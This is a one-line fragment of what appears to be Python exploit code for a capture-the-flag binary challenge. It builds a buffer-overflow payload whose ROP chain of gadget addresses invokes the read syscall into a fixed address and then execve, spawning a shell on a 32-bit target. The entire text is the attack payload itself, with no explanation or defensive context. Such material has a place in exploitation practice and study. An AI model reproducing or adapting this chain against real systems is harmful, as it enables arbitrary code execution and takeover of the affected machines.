...
sh2='b'*0x40+p32(a)+'b'*0xc+p_ebx+p32(0)+p_ecx+p32(0x080e9800)+p_edx+p32(8)+p_eax+p32(0x03)+syscall+p_ebx+p32(0x080e9800)+p_ecx+p32(0)+p_edx+p32(0)+p_eax+p32(0x0b)+syscall
